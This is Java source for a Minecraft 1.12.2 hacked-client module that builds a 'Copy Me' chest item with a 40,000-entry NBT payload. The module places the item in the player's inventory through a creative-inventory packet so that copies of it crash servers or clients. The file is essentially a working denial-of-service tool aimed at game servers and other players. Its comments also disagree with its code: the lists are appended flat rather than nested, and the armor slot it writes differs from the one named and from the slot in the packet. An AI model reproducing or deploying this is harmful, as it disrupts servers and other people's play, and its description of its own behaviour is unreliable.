/*
 * Wurst0 - a 1.12.2 port of Wurst7-CevAPI
 * Ported from Wurst7-CevAPI CrashChestHack (GPL-3.0-or-later)
 *
 * The original builds an item with 40,000 nested NBT lists in its
 * custom-data component. The technique is generic and works on
 * 1.12.2 too: an ItemStack with a huge NBT payload, handed out in
 * creative mode. Copies of this item may crash servers or clients
 * that parse its NBT - kept compatible with the original's intent.
 */
package net.wurst0.hacks;

import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.text.TextComponentString;
import net.wurst0.Category;
import net.wurst0.feature.Hack;

public final class CrashChestHack extends Hack
{
        private static final int NESTED_LISTS = 40000;
        /** creative-inventory slot id of the boots armor slot */
        private static final int CREATIVE_BOOTS_SLOT = 8;

        private final Minecraft mc = Minecraft.getMinecraft();

        public CrashChestHack()
        {
                super("CrashChest",
                        "Gives you a chest item with 40,000 nested NBT"
                                + " lists. Copying it into containers may"
                                + " crash servers. Creative mode only.");
                setCategory(Category.TOOLS);
        }

        @Override
        protected void onEnable()
        {
                EntityPlayerSP p = mc.player;
                if(p == null)
                {
                        setEnabled(false);
                        return;
                }

                if(!p.capabilities.isCreativeMode)
                {
                        error("Creative mode only.");
                        setEnabled(false);
                        return;
                }

                if(!p.inventory.armorInventory.get(3).isEmpty())
                {
                        error("Please clear your shoes slot.");
                        setEnabled(false);
                        return;
                }

                ItemStack stack = new ItemStack(
                        Item.getItemFromBlock(Blocks.CHEST));
                NBTTagList list = new NBTTagList();
                for(int i = 0; i < NESTED_LISTS; i++)
                        list.appendTag(new NBTTagList());
                NBTTagCompound tag = new NBTTagCompound();
                tag.setTag("www.wurstclient.net", list);
                stack.setTagCompound(tag);
                stack.setStackDisplayName("Copy Me");

                p.inventory.armorInventory.set(3, stack);
                if(mc.getConnection() != null)
                        mc.getConnection().sendPacket(
                                new CPacketCreativeInventoryAction(
                                        CREATIVE_BOOTS_SLOT, stack));

                chat("\u00a7a[CrashChest] Item has been placed in your"
                        + " shoes slot.");
                setEnabled(false);
        }

        private void error(String message)
        {
                chat("\u00a7c[CrashChest] " + message);
        }

        private void chat(String message)
        {
                if(mc.player != null)
                        mc.player.sendMessage(new TextComponentString(message));
        }
}
